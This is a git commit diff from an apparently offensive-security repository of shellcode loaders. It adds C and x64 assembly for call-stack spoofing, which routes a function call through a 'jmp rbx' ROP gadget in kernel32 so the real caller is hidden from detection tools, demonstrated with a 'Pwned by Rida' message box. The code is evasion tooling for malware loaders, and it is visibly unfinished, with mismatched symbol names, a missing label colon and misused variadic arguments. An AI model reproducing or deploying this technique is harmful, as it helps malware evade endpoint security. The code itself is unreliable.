c40c5f3a900965fcdb5a14065c3f54888f633672
vRdu <45741890+rzdhop@users.noreply.github.com>
2026-01-21 17:43:52 +0100

    on avance sur le spoofer

--- Loaders/shellcode injectors/Stack-Spoof/Injector.c
+++ Loaders/shellcode injectors/Stack-Spoof/Injector.c
@@ -7,12 +7,11 @@
 /*
 - before executing the shellcode setup the return Addr as one instruction of kernel32.dll (for exemple)
 - This instruction need to be a JMP to a dereferenced register so that we can set the register value ourselves
-- 
 
 */
 typedef struct _STACK_CONFIG {
     PVOID pRopGadget; //PTR to Gadget
-    PVOID pEbx; //PTR to EBX
+    PVOID pRbx; //PTR to the RBX set for the kernel32 spoofed function
     PVOID pTarget; //PTR to function (MessageBoxA or stv)
     PVOID pArgs; //PTR to the args of the functions
     DWORD dwNumberOfArgs; //Nb of ars of the function
@@ -20,12 +19,28 @@ typedef struct _STACK_CONFIG {
 
 extern PVOID spoofCall(PSTACK_CONFIG pConfig);
 
-BOOL SetupConfig(PSTACK_CONFIG pConfig, PVOID pRopGadget, PVOID pEbx, PVOID pTarget, PVOID pArgs, DWORD dwNumberOfArgs) {
+BOOL SetupConfig(PSTACK_CONFIG pConfig, PVOID pRopGadget, PVOID pTarget, DWORD dwNumberOfArgs) {
     BOOL state = TRUE;
+    va_list additionalArgs;
 
+    //According to the fascall ABI convention there is always 4 arguments RCX, RDX, R8, R9
+    pConfig->dwNumberOfArgs = (dwNumberOfArgs > 4) ? dwNumberOfArgs : 4;
+    //If the arguments are impair we add une arg to make it %16 before the call (1 push = 8 bytes)
+    pConfig->dwNumberOfArgs += (dwNumberOfArgs % 2 != 0) ? 1 : 0; //if odd than add one argument (8bytes) else 0
+
+    pConfig->pRopGadget = pRopGadget;
+    pConfig->pTarget = pTarget;
+    pConfig->pArgs = malloc(8 * pConfig->dwNumberOfArgs); //allocate 8 bytes time number of args
+
+    memset(pConfig->pArgs, 0, 8 * pConfig->dwNumberOfArgs);
+    
+    //Say that there is more argument to our function avec DWORD dwNumberOfArgs
+    va_start(additionalArgs, dwNumberOfArgs); //make additianlArgs point to the stack after DWORD dwNumberOfArgs and can be pop
+    for (int i = 0; i < dwNumberOfArgs; i++){
+        ((PUINT64)pConfig->pArgs)[i] = va_arg(additionalArgs, UINT64);
+    }
 
     return state;
-
 }
 
 PVOID FindROPGadget(LPCSTR moduleName)
@@ -55,8 +70,18 @@ PVOID FindROPGadget(LPCSTR moduleName)
 }
 
 int main() {
-    //MessageBoxA();
+    PSTACK_CONFIG config_messagebox = malloc(sizeof(STACK_CONFIG));
+    memset(config_messagebox, 0, sizeof(STACK_CONFIG));
 
+    PVOID pGadget = FindROPGadget("kernel32");
+
+    HANDLE hUser32 = GetModuleHandleA("User32");
+    PVOID pMessageBox = GetProcAddress(hUser32, "MessageBoxA");
+
+    //MessageBoxA( NULL, "injected !", "Pwned by Rida", MB_ICONEXCLAMATION);
+    SetupConfig(config_messagebox, pGadget, pMessageBox, 4, NULL, "injected !", "Pwned by Rida", MB_ICONEXCLAMATION);
+
+    spoofCall(config_messagebox);
 
     return 0;
 
---
+++ Loaders/shellcode injectors/Stack-Spoof/spoofer.asm
@@ -0,0 +1,68 @@
+BITS 64
+DEFAULT REL
+
+struc pConfig
+    .pRopGadget :       RESQ    1 ; 8
+    .pRbx :             RESQ    1 ; 8
+    .pTarget :          RESQ    1 ; 8
+    .pArgs :            RESQ    1 ; 8
+    .dwNumberOfArgs :   RESD    1 ; 4
+    ._PADDING :         RESD    1 ; + 4 padding (align) 
+endstruc 
+
+global spoof
+section .text:
+
+Spoof:
+    pop rdi                                     ;Get the original return Address
+    mov r10, rcx                                ;now r10 is our pConfig base offset
+    mov r12, [r10 + pConfig.dwNumberOfArgs]
+    sub r12, 4                                  ;Remove the registers args (rcx, rdx, r8, r9)
+    mov r13, [r10 + pConfig.pArgs]              ;r13 points to args   
+    mov rcx, [r13] 
+    mov rdx, [r13 + 8]
+    mov r8, [r13 + 16]
+    mov r9, [r13 + 24]
+
+    ; Now we rebuild the stack with the next args with a loop on pConfig.dwNumberOfArgs (r12 here)
+    lea r12, [r12*8]                            ;Calculating the effective size of args to store on stack
+                                                ;We could use imul but using lea is less noisy as it calcule r12 * 8 as if it was an addr even if it's not
+    sub rsp, r12                                ;Allocate space in stack
+
+loop_start :
+    cmp r12, 0                                  
+    jle loop_end
+    ;We add them from last arg to first
+    ;for (r12 = dwNumberOfArgs*8, r12 <= 0, r12 -= 8) {     ;r12 act a i
+    ;   r15 = rsp + r12
+    ;   r15 -= 8 
+    ;   rax = pArgs[-1]                           ;last position in python lol (r13 = pArgs)
+    ;   *r15 = rax
+    ;} 
+    
+    mov r15, rsp
+    add r15, r12
+    sub r15, 8
+    mov rax, [r13 + 24 + r12]                   ; rax = pArgs[dwArgs] - the last arg
+    mov [r15], rax
+    sub r12, 8
+    jmp loop_start
+
+
+
+loop_end
+    mov r13, [r10 + pConfig.dwNumberOfArgs]     ; save to after set back the stack
+    sub rsp, 32                                 ; The shadow space 32 before the call
+    mov rax, [r10 + pConfig.pRopGadget]         ; we will set the return addr to the ROP gadget : jmp rbx
+    push rax                                    ; the return addr of the function that will be called
+    lea rbx, [spoofedFallback]                  ; The spoofed function of kernel32 will jmp to [spoofedFallback]
+    mov [r10 + pConfig.pRbx], rbx
+    mov r12, [r10 + pConfig.pTarget]
+    jmp r12
+
+spoofedFallback:
+    lea r13, [r13*8]
+    add rsp, r13
+    jmp rdi                                     ;The original return addr
+
+
